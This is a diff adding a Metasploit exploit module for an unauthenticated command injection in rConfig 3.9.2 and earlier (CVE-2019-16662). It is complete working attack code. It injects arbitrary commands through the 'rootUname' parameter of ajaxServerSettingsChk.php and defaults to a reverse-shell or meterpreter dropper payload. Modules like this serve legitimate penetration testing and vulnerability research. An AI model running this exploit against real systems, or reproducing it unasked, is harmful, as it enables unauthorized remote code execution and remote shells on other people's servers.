@@ -1,0 +1,114 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'rConfig install Command Execution',
+      'Description'    => %q{
+        This module exploits an unauthenticated command injection vulnerability
+        in rConfig versions 3.9.2 and prior. The `install` directory is not
+        automatically removed after installation, allowing unauthenticated users
+        to execute arbitrary commands via the `ajaxServerSettingsChk.php` file
+        as the web server user.
+
+        This module has been tested successfully on rConfig version 3.9.2 on
+        CentOS 7.7.1908 (x64).
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'mhaskar', # Discovery and exploit
+          'bcoles'   # Metasploit
+        ],
+      'References'     =>
+        [
+          ['CVE', '2019-16662'],
+          ['EDB', '47555'],
+          ['URL', 'https://gist.github.com/mhaskar/ceb65fa4ca57c3cdccc1edfe2390902e'],
+          ['URL', 'https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/']
+        ],
+      'Platform'       => %w[unix linux],
+      'Arch'           => [ARCH_CMD, ARCH_X86, ARCH_X64],
+      'Payload'        => {'BadChars' => "\x00\x0a\x0d\x26"},
+      'Targets'        =>
+        [
+          ['Automatic (Unix In-Memory)',
+            'Platform'       => 'unix',
+            'Arch'           => ARCH_CMD,
+            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},
+            'Type'           => :unix_memory
+          ],
+          ['Automatic (Linux Dropper)',
+            'Platform'       => 'linux',
+            'Arch'           => [ARCH_X86, ARCH_X64],
+            'DefaultOptions' => {'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp'},
+            'Type'           => :linux_dropper
+          ]
+        ],
+      'Privileged'     => false,
+      'DefaultOptions' => { 'SSL' => true, 'RPORT' => 443 },
+      'DisclosureDate' => '2019-10-28',
+      'DefaultTarget'  => 0))
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The base path to rConfig install directory', '/install/'])
+      ])
+  end
+
+  def check
+    res = execute_command('id')
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Unknown
+    end
+
+    if res.code == 404
+      vprint_error 'Could not find install directory'
+      return CheckCode::Safe
+    end
+
+    cmd_res = res.body.scan(%r{The root details provided have not passed: (.+?)<\\/}).flatten.first
+
+    unless cmd_res
+      return CheckCode::Safe
+    end
+
+    vprint_status "Response: #{cmd_res}"
+
+    unless cmd_res.include?('uid=')
+      return CheckCode::Detected
+    end
+
+    CheckCode::Vulnerable
+  end
+
+  def execute_command(cmd, opts = {})
+    vprint_status "Executing command: #{cmd}"
+    send_request_cgi({
+      'uri' => normalize_uri(target_uri.path, '/lib/ajaxHandlers/ajaxServerSettingsChk.php'),
+      'vars_get' => {'rootUname' => ";#{cmd} #"}
+    }, 5)
+  end
+
+  def exploit
+    unless [CheckCode::Detected, CheckCode::Vulnerable].include? check
+      fail_with Failure::NotVulnerable, "#{peer} - Target is not vulnerable"
+    end
+
+    case target['Type']
+    when :unix_memory
+      execute_command(payload.encoded)
+    when :linux_dropper
+      execute_cmdstager(:linemax => 1_500)
+    end
+  end
+end
